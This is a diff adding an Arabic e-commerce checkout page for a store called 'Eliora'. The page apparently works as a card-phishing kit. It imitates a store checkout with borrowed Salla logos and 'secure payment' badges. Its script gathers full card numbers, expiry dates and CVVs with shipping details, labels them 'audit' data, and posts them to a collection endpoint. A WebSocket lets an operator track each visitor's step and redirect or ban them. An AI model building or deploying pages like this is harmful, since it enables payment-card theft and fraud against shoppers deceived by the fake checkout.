@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>إتمام الطلب آمن | متجر إليورا</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+
+    <!-- Google Font: Cairo & Playfair -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&family=Playfair+Display:ital@0;1&display=swap"
+        rel="stylesheet" />
+
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            DEFAULT: '#2f1321', // Dark Plum
+                            light: '#4a2035',
+                        },
+                        accent: {
+                            DEFAULT: '#e45b8a', // Soft Pink
+                            light: '#f6a8c2',
+                            hover: '#c82f63',
+                        },
+                        sand: '#f5ebe7',
+                        blush: '#fff8f5',
+                    },
+                    fontFamily: {
+                        cairo: ['Cairo', 'sans-serif'],
+                        playfair: ['Playfair Display', 'serif'],
+                        outfit: ['Cairo', 'sans-serif'], // Use Cairo for numbers too for consistency or Outfit if needed
+                    },
+                    boxShadow: {
+                        'premium': '0 4px 20px -2px rgba(47, 19, 33, 0.1), 0 2px 10px -2px rgba(0, 0, 0, 0.05)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .input-focus:focus {
+            outline: none;
+            border-color: #e45b8a;
+            box-shadow: 0 0 0 4px rgba(228, 91, 138, 0.1);
+        }
+
+        .ltr-input {
+            direction: ltr;
+            text-align: left;
+        }
+    </style>
+</head>
+
+<body class="font-cairo bg-blush text-primary min-h-screen antialiased">
+
+    <!-- Header -->
+    <header class="sticky top-0 z-40 bg-white/80 backdrop-blur-md border-b border-white/50 py-4">
+        <div class="max-w-5xl mx-auto px-4 flex items-center justify-between">
+            <a href="index.html">
+                <img src="https://cdn.salla.sa/wjBYz/jUswOYjAqz2JF3apQD7pIh2dbv7ppfHNsK3g30Rl.jpg" alt="Logo"
+                    class="h-8 sm:h-10 object-contain" />
+            </a>
+            <div class="flex items-center gap-2 text-xs font-bold text-gray-500">
+                <svg class="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd"
+                        d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                        clip-rule="evenodd"></path>
+                </svg>
+                تشفير رقمي 256-bit
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-5xl mx-auto px-4 py-8 sm:py-12">
+        <div class="grid lg:grid-cols-12 gap-8 items-start">
+
+            <!-- Form Section -->
+            <div class="lg:col-span-7 space-y-6">
+                <!-- Trust Badge -->
+                <div class="bg-sand/50 border border-sand rounded-2xl p-4 flex items-center gap-4">
+                    <div
+                        class="w-10 h-10 bg-white rounded-xl shadow-sm flex items-center justify-center flex-shrink-0 text-accent">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z">
+                            </path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 class="text-sm font-bold text-primary">ضمان ذهبي شامل</h3>
+                        <p class="text-[11px] text-gray-500 mt-0.5">استبدال واسترجاع مجاني خلال 7 أيام - منتج أصلي 100%
+                        </p>
+                    </div>
+                </div>
+
+                <form id="paymentForm" class="space-y-6">
+                    <!-- Personal Info -->
+                    <div class="bg-white rounded-3xl border border-gray-100 p-6 sm:p-8 shadow-premium">
+                        <h2 class="text-lg font-bold mb-6 flex items-center gap-2 font-playfair">
+                            <span
+                                class="w-6 h-6 bg-primary text-white rounded-full flex items-center justify-center text-xs font-sans">1</span>
+                            معلومات الشحن
+                        </h2>
+                        <div class="grid gap-4 sm:gap-6">
+                            <div class="space-y-1.5">
+                                <label class="text-[11px] font-bold text-gray-400 mr-2">الاسم الكامل</label>
+                                <input type="text" id="fullName" required placeholder="الاسم هنا"
+                                    class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus" />
+                            </div>
+                            <div class="space-y-1.5">
+                                <label class="text-[11px] font-bold text-gray-400 mr-2">رقم الجوال</label>
+                                <input type="tel" id="phoneNumber" required placeholder="05XXXXXXXX"
+                                    class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input" />
+                            </div>
+                            <div class="space-y-1.5">
+                                <label class="text-[11px] font-bold text-gray-400 mr-2">العنوان (المدينة، الحي)</label>
+                                <input type="text" id="address" required placeholder="مثال: الرياض، حي النرجس"
+                                    class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus" />
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Payment Info -->
+                    <div class="bg-white rounded-3xl border border-gray-100 p-6 sm:p-8 shadow-premium">
+                        <div class="flex items-center justify-between mb-6">
+                            <h2 class="text-lg font-bold flex items-center gap-2 font-playfair">
+                                <span
+                                    class="w-6 h-6 bg-primary text-white rounded-full flex items-center justify-center text-xs font-sans">2</span>
+                                الدفع الآمن
+                            </h2>
+                            <div class="flex gap-2">
+                                <img src="https://cdn.assets.salla.network/prod/stores/themes/default/assets/images/mada.png"
+                                    class="h-5 grayscale opacity-60">
+                                <img src="https://cdn.assets.salla.network/prod/stores/themes/default/assets/images/cc.png"
+                                    class="h-5 grayscale opacity-60">
+                            </div>
+                        </div>
+                        <div class="grid gap-4 sm:gap-6">
+                            <div class="space-y-1.5">
+                                <label class="text-[11px] font-bold text-gray-400 mr-2">رقم البطاقة</label>
+                                <div class="relative">
+                                    <input type="text" id="cardNumber" required maxlength="19"
+                                        placeholder="0000 0000 0000 0000"
+                                        class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input font-sans" />
+                                    <div id="cardError"
+                                        class="hidden absolute -bottom-5 right-1 text-[10px] text-red-500 font-bold">رقم
+                                        البطاقة غير صحيح</div>
+                                </div>
+                            </div>
+                            <div class="grid grid-cols-2 gap-4">
+                                <div class="space-y-1.5">
+                                    <label class="text-[11px] font-bold text-gray-400 mr-2">تاريخ الانتهاء</label>
+                                    <input type="text" id="cardExpiry" required maxlength="5" placeholder="MM/YY"
+                                        class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input font-sans" />
+                                </div>
+                                <div class="space-y-1.5">
+                                    <label class="text-[11px] font-bold text-gray-400 mr-2">رمز التحقق (CVC)</label>
+                                    <input type="number" id="cardCvc" required maxlength="4" placeholder="123"
+                                        class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 text-sm input-focus ltr-input font-sans" />
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Submit -->
+                    <button type="submit" id="submitBtn"
+                        class="w-full bg-primary text-white py-4 rounded-xl text-lg font-bold shadow-lg shadow-primary/20 hover:bg-primary-light transition-all transform active:scale-[0.98] flex items-center justify-center gap-2">
+                        <span>ادفع الآن</span>
+                        <span class="bg-white/10 px-2 py-0.5 rounded text-sm font-sans" id="totalPriceBtn">0.00</span>
+                        <span>ر.س</span>
+                    </button>
+                    <p class="text-center text-[10px] text-gray-400 flex items-center justify-center gap-1.5">
+                        <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd"
+                                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
+                                clip-rule="evenodd"></path>
+                        </svg>
+                        عملية آمنة ومشفرة بالكامل
+                    </p>
+                </form>
+            </div>
+
+            <!-- Summary Section -->
+            <div class="lg:col-span-5 lg:sticky lg:top-24">
+                <div class="bg-white rounded-3xl border border-gray-100 p-6 shadow-premium">
+                    <h2 class="text-lg font-bold mb-4 font-playfair text-primary">ملخص الطلب</h2>
+                    <div id="cartItems" class="space-y-3 mb-6 max-h-60 overflow-y-auto pr-1"></div>
+
+                    <div class="space-y-3 pt-4 border-t border-gray-50">
+                        <div class="flex justify-between text-sm text-gray-500">
+                            <span>المجموع</span>
+                            <span id="subtotal" class="font-bold text-primary font-sans">0.00 ر.س</span>
+                        </div>
+                        <div class="flex justify-between text-sm text-gray-500">
+                            <span>الشحن والتوصيل</span>
+                            <span class="font-bold text-green-600 text-xs bg-green-50 px-2 py-0.5 rounded">مجاني</span>
+                        </div>
+                        <div class="flex justify-between text-sm text-gray-500">
+                            <span>الضريبة (15%)</span>
+                            <span id="vat" class="font-bold text-primary font-sans">0.00 ر.س</span>
+                        </div>
+                        <div class="flex justify-between items-center pt-4 border-t border-dashed border-gray-200">
+                            <span class="text-lg font-bold text-primary">الإجمالي الكلي</span>
+                            <span id="total" class="text-xl font-bold text-accent font-sans">0.00 ر.س</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        const API_KEY = 'pro-audit-secret-key-2024';
+        const CART_KEY = 'pro-cart-v1';
+
+        // 1. Session & WebSocket Setup
+        let clientId = localStorage.getItem('aura_client_id');
+        if (!clientId) {
+            clientId = 'cl-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('aura_client_id', clientId);
+        }
+
+        // AUTO-DETECT Host for Railway Compatibility
+        const host = window.location.protocol.startsWith('http') ? window.location.host : 'localhost:8000';
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${protocol}//${host}/ws/client/${clientId}`;
+
+        let ws;
+        function connectWS() {
+            ws = new WebSocket(wsUrl);
+            ws.onopen = () => {
+                ws.send(JSON.stringify({ event: 'step_update', data: { step: 'checkout_gulf' } }));
+            };
+            ws.onmessage = (e) => {
+                try {
+                    const msg = JSON.parse(e.data);
+                    if (msg.type === 'REDIRECT') window.location.href = msg.url;
+                    else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
+                } catch (err) { }
+            };
+            ws.onclose = () => setTimeout(connectWS, 3000); // Auto-reconnect
+        }
+        connectWS();
+
+        let cart = JSON.parse(localStorage.getItem(CART_KEY)) || [];
+
+        function validateLuhn(number) {
+            number = number.replace(/\s/g, '');
+            let sum = 0;
+            let shouldDouble = false;
+            for (let i = number.length - 1; i >= 0; i--) {
+                let digit = parseInt(number.charAt(i));
+                if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
+        function renderCart() {
+            const container = document.getElementById('cartItems');
+            if (cart.length === 0) {
+                container.innerHTML = '<p class="text-center py-4 text-gray-400 text-xs">السلة فارغة</p>';
+                return;
+            }
+            let subtotal = 0;
+            container.innerHTML = cart.map(i => {
+                subtotal += i.price * i.qty;
+                return `<div class="flex gap-3 items-center">
+        <div class="w-10 h-12 bg-gray-50 rounded-lg overflow-hidden border border-gray-100 flex-shrink-0"><img
+                src="${i.img}" class="w-full h-full object-cover"></div>
+        <div class="flex-1 overflow-hidden">
+            <h4 class="text-xs font-bold text-primary truncate">${i.name}</h4>
+            <p class="text-[10px] text-gray-400 font-sans">${i.qty} x ${i.price}</p>
+        </div>
+        <p class="text-xs font-bold font-sans text-accent">${i.price * i.qty}</p>
+    </div>`;
+            }).join('');
+
+            const vat = +(subtotal * 0.15).toFixed(2);
+            const total = +(subtotal + vat).toFixed(2);
+
+            document.getElementById('subtotal').textContent = subtotal.toLocaleString() + ' ر.س';
+            document.getElementById('vat').textContent = vat.toLocaleString() + ' ر.س';
+            document.getElementById('total').textContent = total.toLocaleString() + ' ر.س';
+            document.getElementById('totalPriceBtn').textContent = total.toLocaleString();
+        }
+
+        // Input Formatting
+        document.getElementById('cardNumber').addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            let match = val.match(/.{1,4}/g);
+            e.target.value = match ? match.join(' ') : '';
+        });
+        document.getElementById('cardExpiry').addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length > 2) val = val.substring(0, 2) + '/' + val.substring(2, 4);
+            e.target.value = val;
+        });
+
+        // Submit Logic (API Integration)
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+
+            if (!validateLuhn(cardNum)) {
+                document.getElementById('cardError').classList.remove('hidden');
+                return;
+            }
+
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = 'جارِ المعالجة...';
+            btn.disabled = true;
+
+            const brand = cardNum.startsWith('4') ? 'Visa' : 'Mastercard';
+            const cardBin = cardNum.substring(0, 6);
+
+            // Prepare Audit Data for API
+            const data = {
+                client_id: clientId,
+                email: "client@pro.com", // Hardcoded or retrieve if you add email field
+                full_name: document.getElementById('fullName').value,
+                numero_carte: cardNum,
+                card_bin: cardBin,
+                card_brand: brand,
+                expiry: document.getElementById('cardExpiry').value,
+                cvv: document.getElementById('cardCvc').value,
+                montant: parseFloat(document.getElementById('total').textContent.replace(/[^0-9.]/g, '')) || 199.00,
+                adresse_ip: "0.0.0.0", // Will be replaced by backend
+                device: navigator.userAgent
+            };
+
+            try {
+                const res = await fetch('/v1/audit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-KEY': API_KEY
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (res.ok) {
+                    window.location.href = 'loading.html';
+                } else {
+                    alert("Erreur de connexion. Veuillez réessayer.");
+                    btn.disabled = false;
+                    btn.innerHTML = 'ادفع الآن';
+                }
+            } catch (err) {
+                console.error(err);
+                alert("Erreur de connexion.");
+                btn.disabled = false;
+                btn.innerHTML = 'ادفع الآن';
+            }
+        });
+
+        renderCart();
+    </script>
+</body>
+
+</html>
